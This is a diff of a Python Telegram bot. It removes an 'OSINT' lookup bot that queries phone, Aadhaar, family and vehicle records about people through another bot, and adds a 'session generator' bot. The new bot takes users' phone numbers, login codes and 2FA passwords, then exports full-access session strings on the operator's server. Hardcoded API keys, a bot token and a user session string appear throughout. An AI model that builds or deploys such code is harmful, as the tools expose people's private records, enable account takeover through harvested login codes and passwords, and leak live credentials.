@@ -1,214 +1,326 @@
-import os
 import asyncio
-import logging
-
-# --- ⚠️ CRITICAL FIX FOR PYTHON 3.10+ / 3.14 (MUST BE AT THE TOP) ---
-# This creates an event loop before Pyrogram tries to find one during import.
-try:
-    asyncio.get_event_loop()
-except RuntimeError:
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
-# --- NOW IMPORT EVERYTHING ELSE ---
-import json
-import re
-from threading import Thread
+from pyrogram import Client, filters
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from pyrogram.errors import UserNotParticipant
+from pyrogram.enums import ChatMemberStatus
+import time
+from datetime import datetime
+import os
 from flask import Flask
-from pyrogram import Client, filters, idle
-from pyrogram.errors import PeerIdInvalid
+from threading import Thread
 
-# --- LOGGING SETUP ---
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+# ---------------------------------------------------------
+# ⚠️ CONFIGURATION
+# ---------------------------------------------------------
+API_ID = 37314366
+API_HASH = "bd4c934697e7e91942ac911a5a287b46"
+BOT_TOKEN = "8319710991:AAGjPDlurUUIhEkenfkymicf8WL5H6L4f4k"
 
-# --- FAKE WEBSITE FOR RENDER ---
-web_app = Flask(__name__)
+# Force Subscribe Channels
+FORCE_CHANNELS = [
+    {"title": "First Channel", "id": -1003387459132, "url": "https://t.me/+wZ9rDQC5fkYxOWJh"},
+    {"title": "Second Channel", "id": -1003892920891, "url": "https://t.me/+Om1HMs2QTHk1N2Zh"}
+]
 
-@web_app.route('/')
+SESSION_NAME = "magma_force_v8"
+
+# Global variables
+user_sessions = {}
+
+# ---------------------------------------------------------
+# 🌐 FLASK WEB SERVER (KEEP ALIVE)
+# ---------------------------------------------------------
+flask_app = Flask(__name__)
+
+@flask_app.route('/')
 def home():
-    return "⚡ Gourisen OSINT Bot is Running Successfully!"
+    return "Bot is Running 24/7 with Force Sub 🚀"
 
 def run_web():
-    port = int(os.environ.get("PORT", 8080))
-    web_app.run(host="0.0.0.0", port=port)
+    flask_app.run(host="0.0.0.0", port=8080)
 
 def keep_alive():
     t = Thread(target=run_web)
-    t.daemon = True
     t.start()
 
-# --- CONFIGURATION ---
-API_ID = 37314366
-API_HASH = "bd4c934697e7e91942ac911a5a287b46"
+# ---------------------------------------------------------
+# 🤖 BOT CLIENT
+# ---------------------------------------------------------
+app = Client(
+    SESSION_NAME, 
+    api_id=API_ID, 
+    api_hash=API_HASH, 
+    bot_token=BOT_TOKEN
+)
 
-# --- 🔐 SESSION STRING (Latest Working String Kept) ---
-SESSION_STRING = "BQI5Xz4AYmk4kg6TAh1_7Ebt65uwpCt5ryzpfEb-DlJ-hwhK2OuYoKI9Rboc391MVc-TRBHL_eQkMYyl1WVuKq9po2r6RKIJBLPf9vzO7_fWiDSz0tC1XUDFFvX1PrmUFls8cZgJWg1TZx6EOYhlTMnXhhWfBOnHXb5orXyFlRd5sxrXCC-A-kEnmtfAi1UGuX4tgzUplpgYDQHS1lQK-vPExaML7FajZfsasoIXvOFWRndMSY3qOqhSqm-ZLIhRhaVa333weGM8z4hQqE9iuvsYFr4wwwAnYaRRSBob8MfIN5tGSyZpbT-6iOZTyx7ttqTh6mKqn0JatY3Lk1n6P7ulu3Pv_gAAAAFJSgVkAA"
+# ---------------------------------------------------------
+# 🔒 FORCE SUBSCRIBE CHECKER
+# ---------------------------------------------------------
 
-TARGET_BOT = "Random_insight69_bot"
-
-app = Client("gourisen_osint_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
-
-# --- DASHBOARD ---
-@app.on_message(filters.command(["start", "help", "menu"], prefixes="/") & (filters.private | filters.group))
-async def show_dashboard(client, message):
-    try:
-        # --- UPDATED DASHBOARD (NAME CHANGED, CREDIT REMOVED) ---
-        text = (
-            "📖 **Gourisen OSINT DASHBOARD**\n"
-            "━━━━━━━━━━━━━━━━━━\n\n"
-            "🔍 **Lookup Services:**\n"
-            "📱 `/num [number]`\n🚗 `/vehicle [plate]`\n🆔 `/aadhar [uid]`\n"
-            "👨‍👩‍👧‍👦 `/familyinfo [uid]`\n🔗 `/vnum [plate]`\n💸 `/fam [id]`\n📨 `/sms [number]`\n"
-            "━━━━━━━━━━━━━━━━━━"
-        )
-        await message.reply_text(text, disable_web_page_preview=True)
-    except Exception as e:
-        logger.error(f"Error in dashboard: {e}")
-
-# --- MAIN LOGIC ---
-@app.on_message(filters.command(["num", "vehicle", "aadhar", "familyinfo", "vnum", "fam", "sms"], prefixes="/") & (filters.private | filters.group))
-async def process_request(client, message):
-
-    try:
-        if len(message.command) < 2:
-            return await message.reply_text(f"❌ **Data Missing!**\nUsage: `/{message.command[0]} <value>`")
-
-        status_msg = await message.reply_text(f"🔍 **Searching via Gourisen OSINT...**")
-
+async def get_force_sub_buttons(client, user_id):
+    """Check membership and return buttons if not joined"""
+    buttons = []
+    not_joined = False
+    
+    for channel in FORCE_CHANNELS:
         try:
-            sent_req = await client.send_message(TARGET_BOT, message.text)
-        except PeerIdInvalid:
-             await status_msg.edit("❌ **Error:** Target Bot ID invalid. Userbot must start @Random_insight69_bot first.")
-             return
+            member = await client.get_chat_member(channel["id"], user_id)
+            if member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT]:
+                buttons.append([InlineKeyboardButton(f"🔔 Join {channel['title']}", url=channel['url'])])
+                not_joined = True
+        except UserNotParticipant:
+            buttons.append([InlineKeyboardButton(f"🔔 Join {channel['title']}", url=channel['url'])])
+            not_joined = True
         except Exception as e:
-            await status_msg.edit(f"❌ **Request Error:** {e}")
+            # If bot is not admin or channel invalid, we skip to avoid blocking users unnecessarily
+            print(f"⚠️ Error checking channel {channel['id']}: {e}")
+            pass
+            
+    if not_joined:
+        buttons.append([InlineKeyboardButton("✅ I Have Joined", callback_data="check_joined")])
+        return InlineKeyboardMarkup(buttons)
+    return None
+
+@app.on_callback_query(filters.regex("check_joined"))
+async def on_check_joined(client, callback: CallbackQuery):
+    """Handle the 'I Have Joined' button click"""
+    buttons = await get_force_sub_buttons(client, callback.from_user.id)
+    
+    if buttons:
+        await callback.answer("❌ You haven't joined all channels yet!", show_alert=True)
+    else:
+        await callback.message.delete()
+        await callback.message.reply(
+            "✅ **Verification Successful!**\n\n"
+            "Now you can use the bot.\n"
+            "👉 Send /get to generate session."
+        )
+
+# ---------------------------------------------------------
+# 🛠 HELPER FUNCTIONS
+# ---------------------------------------------------------
+
+async def get_session_string(temp_client):
+    try:
+        return await temp_client.export_session_string()
+    except:
+        try: return await temp_client.storage.export_session_string()
+        except: return None
+
+# ---------------------------------------------------------
+# 🤖 BOT COMMANDS
+# ---------------------------------------------------------
+
+@app.on_message(filters.command("start"))
+async def start(client, message):
+    # Force Sub Check
+    buttons = await get_force_sub_buttons(client, message.from_user.id)
+    if buttons:
+        await message.reply(
+            "🔒 **Access Denied!**\n\n"
+            "You must join our channels to use this bot.",
+            reply_markup=buttons
+        )
+        return
+
+    await message.reply(
+        "🤖 **Session Generator Bot**\n\n"
+        "📱 Send /get to generate your Telegram session string!\n"
+        "🔒 **Safe & Secure** - No API_ID/HASH needed!\n\n"
+        "🔧 **Developer:** @MAGMAxRICH"
+    )
+
+@app.on_message(filters.command("get"))
+async def get_session(client, message):
+    # Force Sub Check
+    buttons = await get_force_sub_buttons(client, message.from_user.id)
+    if buttons:
+        await message.reply(
+            "🔒 **Access Denied!**\n\n"
+            "You must join our channels to use this bot.",
+            reply_markup=buttons
+        )
+        return
+
+    user_id = message.from_user.id
+    if user_id in user_sessions:
+        await message.reply("⚠️ You already have an active process. Type /cancel to start new.")
+        return
+    
+    user_sessions[user_id] = {
+        "step": "phone",
+        "phone": None,
+        "client": None,
+        "timestamp": time.time()
+    }
+    
+    await message.reply(
+        "📱 **Step 1/2: Phone Number**\n\n"
+        "📞 Send your phone number:\n"
+        "**Example:** `+919876543210`\n"
+        "**Example:** `+1234567890`\n\n"
+        "❌ Type /cancel to stop."
+    )
+
+@app.on_message(filters.command("cancel"))
+async def cancel_session(client, message):
+    user_id = message.from_user.id
+    if user_id in user_sessions:
+        if user_sessions[user_id].get("client"):
+            try: await user_sessions[user_id]["client"].disconnect()
+            except: pass
+        del user_sessions[user_id]
+        await message.reply("✅ Process cancelled.")
+    else:
+        await message.reply("⚠️ No active session to cancel.")
+
+# ---------------------------------------------------------
+# 📨 MESSAGE HANDLER
+# ---------------------------------------------------------
+
+@app.on_message(filters.text & filters.private)
+async def handle_text(client, message):
+    user_id = message.from_user.id
+    
+    # Ignore if user not in session process
+    if user_id not in user_sessions:
+        # Optional: You can force sub check here too if you want strict checking
+        return
+    
+    # Timeout Check (10 mins)
+    if time.time() - user_sessions[user_id]["timestamp"] > 600:
+        if user_sessions[user_id].get("client"):
+            try: await user_sessions[user_id]["client"].disconnect()
+            except: pass
+        del user_sessions[user_id]
+        await message.reply("⏰ Session expired. Please use /get to start again.")
+        return
+
+    step = user_sessions[user_id]["step"]
+    text = message.text.strip()
+
+    if text.lower() == "/cancel":
+        await cancel_session(client, message)
+        return
+
+    # --- STEP 1: PHONE NUMBER ---
+    if step == "phone":
+        if not text.startswith("+") or len(text) < 10:
+            await message.reply("❌ **Invalid!** Example: `+919876543210`")
             return
 
-        target_response = None
-
-        # --- SMART WAIT LOOP ---
-        for attempt in range(30): 
-            await asyncio.sleep(2) 
-            try:
-                async for log in client.get_chat_history(TARGET_BOT, limit=1):
-                    if log.id == sent_req.id: continue
-
-                    text_content = (log.text or log.caption or "").lower()
-
-                    ignore_words = [
-                        "wait", "processing", "searching", "scanning", 
-                        "generating", "loading", "checking", 
-                        "looking up", "uploading", "sending file", 
-                        "attaching", "sending"
-                    ]
-
-                    if any(word in text_content for word in ignore_words) and not log.document:
-                        if f"Attempt {attempt+1}" not in status_msg.text:
-                            await status_msg.edit(f"⏳ **Fetching Data... (Attempt {attempt+1})**")
-                        continue 
-
-                    if log.document or "{" in text_content or "success" in text_content:
-                        target_response = log
-                        break
-
-                    target_response = log
-                    break
-
-            except Exception as e:
-                logger.error(f"Error fetching history: {e}")
-
-            if target_response: break
-
-        if not target_response:
-            await status_msg.edit("❌ **No Data Found**")
-            return
-
-        # --- DATA HANDLING ---
-        raw_text = ""
-        if target_response.document:
-            await status_msg.edit("📂 **Downloading Result File...**")
-            try:
-                file_path = await client.download_media(target_response)
-                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                    raw_text = f.read()
-                os.remove(file_path)
-            except Exception as e:
-                await status_msg.edit(f"❌ **File Error:** {e}")
-                return
-        elif target_response.text:
-            raw_text = target_response.text
-        elif target_response.caption:
-            raw_text = target_response.caption
-
-        if not raw_text or len(raw_text.strip()) < 2:
-            await status_msg.edit("❌ **No Data Found**")
-            return
-
-        # --- 🔥 AGGRESSIVE CLEANING ---
-        raw_text = raw_text.replace(r"⚡ Designed & Powered by @DuXxZx\_info", "")
-        raw_text = raw_text.replace("⚡ Designed & Powered by @DuXxZx_info", "")
-        raw_text = raw_text.replace(r"@DuXxZx\_info", "").replace("@DuXxZx_info", "")
-        raw_text = raw_text.replace("====================\n\n", "====================\n")
-
-        # JSON Parsing
-        final_output = raw_text 
+        user_sessions[user_id]["phone"] = text
+        user_sessions[user_id]["step"] = "otp"
+        
         try:
-            clean_text = raw_text.replace("```json", "").replace("```", "").strip()
-            json_match = re.search(r'\{.*\}', clean_text, re.DOTALL)
+            temp_client = Client(f"mem_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+            await temp_client.connect()
+            sent_code = await temp_client.send_code(text)
+            user_sessions[user_id]["client"] = temp_client
+            user_sessions[user_id]["hash"] = sent_code.phone_code_hash
+            
+            await message.reply(
+                "✅ **OTP Sent!**\n\n"
+                "🔢 Please send the OTP with spaces:\n"
+                "**Correct:** `1 2 3 4 5`\n\n"
+                "⚠️ If you have 2FA, you will be asked for password next."
+            )
+        except Exception as e:
+            await message.reply(f"❌ Error: {e}\nTry again with /get")
+            del user_sessions[user_id]
 
-            if json_match:
-                parsed_data = json.loads(json_match.group(0))
-                results = []
-                if "data" in parsed_data:
-                    data_part = parsed_data["data"]
-                    if isinstance(data_part, list) and len(data_part) > 0:
-                        if "results" in data_part[0]:
-                            results = data_part[0]["results"]
-                        else:
-                            results = data_part
-                    elif isinstance(data_part, dict):
-                        if "results" in data_part:
-                            results = data_part["results"]
-                        else:
-                            results = [data_part]
-                elif "results" in parsed_data:
-                    results = parsed_data["results"]
+    # --- STEP 2: OTP ---
+    elif step == "otp":
+        otp = text.replace(" ", "")
+        try:
+            tc = user_sessions[user_id]["client"]
+            ph = user_sessions[user_id]["phone"]
+            ch = user_sessions[user_id]["hash"]
+            
+            try:
+                await tc.sign_in(ph, ch, phone_code=otp)
+            except Exception as e:
+                if "SESSION_PASSWORD_NEEDED" in str(e):
+                    user_sessions[user_id]["step"] = "2fa"
+                    await message.reply("🔐 **2FA Detected!**\nPlease send your 2FA Password.")
+                    return
                 else:
-                    results = parsed_data
+                    raise e
+            
+            await send_session_data(client, message, tc, ph)
+            
+        except Exception as e:
+            await message.reply(f"❌ OTP Error: {e}")
 
-                final_output = json.dumps(results, indent=4, ensure_ascii=False)
-        except Exception:
-            pass
-
-        # --- SENDING RESULT (NO FOOTER, NO AUTO DELETE) ---
-        formatted_msg = f"```json\n{final_output}\n```"
-        await status_msg.delete()
-
-        if len(formatted_msg) > 4000:
-            chunks = [formatted_msg[i:i+4000] for i in range(0, len(formatted_msg), 4000)]
-            for chunk in chunks:
-                await message.reply_text(chunk)
-                await asyncio.sleep(1) 
-        else:
-            await message.reply_text(formatted_msg)
-
-    except Exception as e:
+    # --- STEP 3: 2FA ---
+    elif step == "2fa":
         try:
-            await status_msg.edit(f"❌ **Error:** {str(e)}")
-        except:
-            pass
+            tc = user_sessions[user_id]["client"]
+            ph = user_sessions[user_id]["phone"]
+            await tc.check_password(text)
+            await send_session_data(client, message, tc, ph)
+        except Exception as e:
+            await message.reply(f"❌ Password Error: {e}\nTry again.")
 
-# --- START SERVER & BOT ---
-async def start_bot():
-    print("🚀 Starting Web Server...")
-    keep_alive() 
-    print("🚀 Starting Pyrogram Client...")
-    await app.start()
-    print("✅ Bot is Online!")
-    await idle()
-    await app.stop()
+async def send_session_data(bot, message, temp_client, phone):
+    try:
+        session_string = await get_session_string(temp_client)
+        user_info = await temp_client.get_me()
+        user_id = message.from_user.id
+        name = (user_info.first_name or "")
+        
+        text_header = (
+            f"🎉 **SESSION GENERATED!**\n\n"
+            f"👤 **User:** {name}\n"
+            f"📱 **Phone:** `{phone}`\n"
+            f"🆔 **ID:** `{user_info.id}`\n\n"
+            f"📋 **YOUR SESSION STRING:**"
+        )
+        
+        if len(session_string) > 3500:
+            await message.reply(text_header + "\n(Sending in parts...)")
+            parts = [session_string[i:i+3500] for i in range(0, len(session_string), 3500)]
+            for part in parts: await message.reply(f"`{part}`")
+        else:
+            await message.reply(f"{text_header}\n\n`{session_string}`")
+
+        try:
+            await temp_client.send_message("me", f"📱 **Session**\nPhone: {phone}\n\n`{session_string}`")
+            await message.reply("✅ Also sent to Saved Messages!")
+        except: pass
+            
+        await message.reply("⚠️ **SECURITY WARNING:** Do not share this with anyone!\n🔧 **POWERED BY:** @Anysnapupdate")
+        
+    except Exception as e:
+        await message.reply(f"❌ Error: {e}")
+    finally:
+        await temp_client.disconnect()
+        if user_id in user_sessions: del user_sessions[user_id]
+
+# ---------------------------------------------------------
+# 🚀 MAIN EXECUTION
+# ---------------------------------------------------------
+
+async def main():
+    print("🚀 Session Bot Starting...")
+    keep_alive()
+    print("🌐 Flask Server Started!")
+
+    if os.path.exists(f"{SESSION_NAME}.session"):
+        try: os.remove(f"{SESSION_NAME}.session")
+        except: pass
+
+    print("🤖 Bot is initializing...")
+    try:
+        await app.start()
+        print(f"✅ Bot @{app.me.username} is running!")
+        await asyncio.Event().wait()
+    except Exception as e:
+        print(f"\n❌ STARTUP ERROR: {e}")
 
 if __name__ == "__main__":
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(start_bot())
+    try:
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(main())
+    except KeyboardInterrupt:
+        print("\n👋 Bot stopped.")
